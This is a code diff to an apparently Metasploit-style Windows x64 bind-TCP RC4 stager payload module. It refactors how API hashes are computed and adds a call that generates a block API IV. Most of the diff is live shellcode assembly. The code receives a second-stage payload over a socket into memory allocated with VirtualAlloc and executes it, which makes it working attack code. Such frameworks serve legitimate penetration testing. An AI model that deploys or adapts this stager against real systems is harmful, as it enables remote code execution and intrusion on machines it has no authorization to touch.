@@ -46,6 +46,7 @@ module Payload::Windows::BindTcpRc4_x64
   # Generate and compile the stager
   #
   def generate_bind_tcp_rc4(opts={})
+    block_api_iv # ensure the block API IV is generated before we generate the shellcode so that the hashes are correct
     combined_asm = %Q^
       cld                     ; Clear the direction flag.
       and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
@@ -71,7 +72,7 @@ module Payload::Windows::BindTcpRc4_x64
         push 4                  ;
         pop r8                  ; length = sizeof( DWORD );
         mov rcx, rdi            ; the saved socket
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'recv')}
         call rbp                ; recv( s, &dwLength, 4, 0 );
         add rsp, 32             ; we restore RSP from the api_call so we can pop off RSI next
 
@@ -86,7 +87,7 @@ module Payload::Windows::BindTcpRc4_x64
         pop r8                  ; MEM_COMMIT
         mov rdx, rsi            ; the newly received second stage length.
         xor rcx,rcx             ; NULL as we dont care where the allocation is.
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
         ; Receive the second stage and execute it...
         ; mov rbx, rax            ; rbx = our new memory address for the new stage
@@ -102,7 +103,7 @@ module Payload::Windows::BindTcpRc4_x64
         mov r8, rsi             ; length
         mov rdx, rbx            ; the current address into our second stages RWX buffer
         mov rcx, rdi            ; the saved socket
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'recv')}
         call rbp                ; recv( s, buffer, length, 0 );
         add rsp, 32             ; restore stack after api_call
 
